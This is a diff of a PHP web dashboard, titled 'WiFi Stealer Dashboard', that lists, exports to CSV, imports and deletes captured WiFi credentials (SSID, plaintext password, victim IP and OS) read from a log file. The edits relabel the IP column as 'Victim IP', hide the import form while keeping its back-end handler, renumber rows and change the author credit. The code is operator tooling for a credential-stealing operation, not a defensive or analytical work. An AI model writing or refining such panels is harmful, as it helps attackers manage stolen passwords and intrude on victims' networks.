@@ -1,7 +1,7 @@
 <?php
 // WiFi credential logger dashboard
 // Single-file implementation (with safer parsing and real capture time)
-// + CSV export / import
+// + CSV export (import kept as backend-only)
 
 date_default_timezone_set('Asia/Kolkata');
 
@@ -72,7 +72,8 @@ if (isset($_GET['action']) && $_GET['action'] === 'export_csv') {
     header('Content-Disposition: attachment; filename="' . $filename . '"');
     $fp = fopen('php://output', 'w');
 
-    fputcsv($fp, ['Time', 'SSID', 'Password', 'Attacker IP', 'OS']);
+    // Renamed column from "Attacker IP" to "Victim IP"
+    fputcsv($fp, ['Time', 'SSID', 'Password', 'Victim IP', 'OS']);
 
     foreach ($records as $row) {
         fputcsv($fp, $row);
@@ -82,7 +83,7 @@ if (isset($_GET['action']) && $_GET['action'] === 'export_csv') {
     exit;
 }
 
-// --- 2. CSV IMPORT: upload CSV and append to wifi_creds.log ---
+// --- 2. CSV IMPORT: backend-only (no visible form) ---
 if (isset($_POST['action']) && $_POST['action'] === 'import_csv') {
     if (!isset($_FILES['csv_file']) || $_FILES['csv_file']['error'] !== UPLOAD_ERR_OK) {
         $importStatus = 'Error: No file uploaded or upload failed.';
@@ -96,6 +97,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'import_csv') {
                 $importStatus = 'Cannot read uploaded file.';
             } else {
                 $addedCount = 0;
+                // single backslash as escape
                 while (($fields = fgetcsv($fp, 0, ',', '"', '\\')) !== false) {
                     if (count($fields) >= 5) {
                         $line = '"' . implode('","', array_map('trim', $fields)) . '"' . PHP_EOL;
@@ -225,6 +227,7 @@ foreach ($rawLines as $rawLine) {
         }
 
         $captureEntries[] = [
+            // index will still be 0-based here; we’ll display +1 in HTML
             'idx'      => count($captureEntries),
             'time'     => $timestamp,
             'ip'       => $sourceIP !== '' ? $sourceIP : 'offline',
@@ -252,7 +255,6 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
     <meta charset="UTF-8">
     <title>WiFi Stealer Dashboard</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-
     <style>
         body {
             margin: 0;
@@ -260,7 +262,6 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             background: radial-gradient(circle at top left, #0f172a 0, #020617 40%, #000 100%);
             color: #e5e7eb;
         }
-
         .page {
             max-width: 1100px;
             margin: 0 auto;
@@ -270,7 +271,6 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             flex-direction: column;
             gap: 16px;
         }
-
         .page-header {
             display: flex;
             flex-wrap: wrap;
@@ -278,34 +278,28 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             justify-content: space-between;
             gap: 12px;
         }
-
         .title-group {
             display: flex;
             flex-direction: column;
             gap: 4px;
         }
-
         .title {
             font-size: 22px;
             font-weight: 600;
         }
-
         .subtitle {
             font-size: 12px;
             color: #9ca3af;
         }
-
         .viewer-meta {
             font-size: 11px;
             color: #9ca3af;
         }
-
         .actions {
             display: flex;
             flex-wrap: wrap;
             gap: 8px;
         }
-
         .btn {
             font-size: 12px;
             border-radius: 999px;
@@ -315,54 +309,45 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             color: #e5e7eb;
             cursor: pointer;
         }
-
         .btn:hover {
             border-color: #4f46e5;
             box-shadow: 0 0 0 1px rgba(79,70,229,0.5);
         }
-
         .btn-danger {
             border-color: rgba(248,113,113,0.7);
             color: #fecaca;
             background: linear-gradient(135deg, rgba(127,29,29,0.9), rgba(127,29,29,0.6));
         }
-
         .btn-danger:hover {
             box-shadow: 0 0 0 1px rgba(248,113,113,0.7);
         }
-
         .btn-sm {
             padding: 4px 8px;
             font-size: 11px;
         }
-
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
             gap: 12px;
         }
-
         .stat-card {
             background: #0f172a;
             border-radius: 10px;
             padding: 10px 12px;
             border: 1px solid rgba(148,163,184,0.25);
         }
-
         .stat-label {
             font-size: 11px;
             text-transform: uppercase;
             letter-spacing: 0.08em;
             color: #9ca3af;
         }
-
         .stat-value {
             margin-top: 4px;
             font-size: 18px;
             font-weight: 600;
             color: #e5e7eb;
         }
-
         .card {
             background: rgba(15,23,42,0.95);
             border-radius: 12px;
@@ -370,19 +355,16 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             box-shadow: 0 22px 45px rgba(15,23,42,0.7);
             padding: 12px 14px;
         }
-
         table {
             width: 100%;
             border-collapse: collapse;
             font-size: 12px;
         }
-
         th, td {
             padding: 6px 8px;
             border-bottom: 1px solid rgba(55,65,81,0.8);
             text-align: left;
         }
-
         th {
             font-size: 11px;
             text-transform: uppercase;
@@ -390,32 +372,26 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             color: #9ca3af;
             background: radial-gradient(circle at top left, rgba(79,70,229,0.25), transparent 60%);
         }
-
         tr:hover {
             background: rgba(31,41,55,0.7);
         }
-
         .badge {
             display: inline-block;
             border-radius: 999px;
             padding: 2px 6px;
             font-size: 10px;
         }
-
         .badge-weak {
             background: rgba(248,113,113,0.18);
             color: #fecaca;
         }
-
         .badge-ok {
             background: rgba(74,222,128,0.18);
             color: #bbf7d0;
         }
-
         .password {
             font-family: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
         }
-
         .footer {
             margin-top: auto;
             font-size: 11px;
@@ -425,11 +401,10 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             border-top: 1px solid rgba(31,41,55,0.9);
         }
     </style>
-
     <script>
         var autoRefresh = false;
         var refreshTimer = null;
-        var REFRESH_INTERVAL = 10000; // refresh every 10 seconds
+        var REFRESH_INTERVAL = 10000;
 
         function toggleAutoRefresh(enabled) {
             autoRefresh = enabled;
@@ -494,18 +469,7 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             </div>
         </div>
         <div class="actions">
-            <!-- Import CSV form -->
-            <form method="POST" enctype="multipart/form-data" style="display:inline;">
-                <input type="hidden" name="action" value="import_csv">
-                <label for="csv_file" style="font-size:0.9em;">Import CSV:</label>
-                <input type="file" name="csv_file" id="csv_file" accept=".csv" required style="margin:0 0.5em;">
-                <button type="submit" class="btn">Upload CSV</button>
-            </form>
-
-            <!-- Export CSV button -->
             <a href="?action=export_csv" class="btn">Export to CSV</a>
-
-            <!-- View mode switcher -->
             <a href="?view=full" class="btn btn-sm"
                style="text-decoration:none; <?php echo $viewMode === 'full' ? 'border-color:#4f46e5;' : ''; ?>">
                 Full view
@@ -514,16 +478,12 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
                style="text-decoration:none; <?php echo $viewMode === 'compact' ? 'border-color:#4f46e5;' : ''; ?>">
                 Compact view
             </a>
-
-            <!-- Auto-refresh button -->
             <button type="button"
                     class="btn"
                     id="auto-refresh-toggle"
                     onclick="toggleAutoRefresh(!autoRefresh);">
                 Auto-refresh: OFF
             </button>
-
-            <!-- Clear history button -->
             <form method="post"
                   onsubmit="return confirm('Delete ALL history? This cannot be undone.');"
                   style="display:inline;">
@@ -541,7 +501,6 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
         </p>
     <?php endif; ?>
 
-    <!-- Statistics cards -->
     <div class="stats-grid">
         <div class="stat-card">
             <div class="stat-label">Total captures</div>
@@ -572,7 +531,7 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
                 <th>#</th>
                 <th>Time (IST)</th>
                 <?php if ($viewMode === 'full'): ?>
-                    <th>Source IP</th>
+                    <th>Victim IP</th>
                     <th>OS</th>
                 <?php endif; ?>
                 <th>SSID</th>
@@ -596,7 +555,8 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             <?php else: ?>
                 <?php foreach ($captureEntries as $entry): ?>
                     <tr>
-                        <td><?php echo htmlspecialchars($entry['idx']); ?></td>
+                        <!-- Start counting from 1 -->
+                        <td><?php echo htmlspecialchars($entry['idx'] + 1); ?></td>
                         <td><?php echo htmlspecialchars($entry['time']); ?></td>
 
                         <?php if ($viewMode === 'full'): ?>
@@ -637,6 +597,7 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
                                   style="display:inline;"
                                   onsubmit="return confirm('Delete this entry?');">
                                 <input type="hidden" name="action" value="delete_one">
+                                <!-- still pass the 0-based idx key to delete -->
                                 <input type="hidden" name="idx" value="<?php echo htmlspecialchars($entry['idx']); ?>">
                                 <button type="submit" class="btn btn-sm btn-danger">
                                     Delete
@@ -651,7 +612,7 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
     </div>
 
     <div class="footer">
-        © 2026 WiFi Stealer Dashboard – made by Zypher17
+        © 2026 WiFi Stealer Dashboard – made by narain
     </div>
 </div>
 </body>
